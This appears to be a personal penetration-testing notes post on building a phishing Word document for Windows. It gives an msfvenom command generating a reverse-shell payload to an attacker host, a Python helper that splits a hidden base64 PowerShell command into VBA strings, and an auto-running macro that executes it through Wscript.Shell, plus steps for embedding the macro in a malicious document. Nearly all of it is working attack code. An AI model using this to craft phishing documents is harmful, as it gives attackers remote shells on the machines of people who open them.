---
layout: post
title:  "windows - phishing"
date:   2022-01-01
categories: linux
---


## Phishing 


```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh
```

## python splitter

```python
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print ("Str = Str + " + '"' + str[i:i+n] + '"')
```

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
Str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
...
    CreateObject("Wscript.Shell").Run Str
End Sub
```


## Add macro to file

```
View -> Macros ->  View Marcos -> Macros in malicious document name(document) -> Create -> paste the above code -> save as doc
```
